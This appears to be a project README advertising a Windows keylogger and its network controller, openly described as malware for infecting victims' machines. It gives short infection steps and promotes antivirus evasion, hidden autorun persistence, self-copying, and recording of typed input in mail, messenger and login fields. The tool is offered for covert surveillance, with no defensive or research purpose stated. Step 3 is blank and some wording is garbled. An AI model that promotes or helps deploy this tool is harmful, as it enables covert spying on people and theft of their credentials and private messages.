**An advanced keylogger for Windows starting with the 7th version and ending with the latest. At the time of writing, Malware is Not Detected by Any Antivirus. The [Controller](https://github.com/ArGul-0/Local-Keylogger-Controller) allows you to Automatically Detect and Pull Logs from All Infected PCs on the Local Network.**

**Brief instructions for use:**

**1.** Run the Local Keylogger Agent on the victim's machine (accept the request for administrator rights, this is mandatory).

**2.** That's it, the target PC is now infected, you can delete the Agent's original .exe file if you want to.

**3.** 



**Main advantages:**

**•** Absolutely does not get burned by any antiviruses.

**•** The controller automatically detects all infected machines on the local network and pulls logs from them to the hacker's device.

**•** It has a recording mode not only for all clicks, but also for field entries (in this mode, for example, playing games will not be recorded, but input in the fields of mail, flogging, messengers and all other places where you can type will be recorded).

**•** It is sewn into the system, adds itself to the hidden autorun and creates its own copy, so that you can even delete the original one after the 1st launch.the exe file.

**Cons, unfortunately, it doesn't happen without them:**

**•** Remote log pulling only works while on the same local network with infected devices.

**•** Malware works within the user who launched the malicious file (not on all users at the same time, each one will have to run the malware separately).
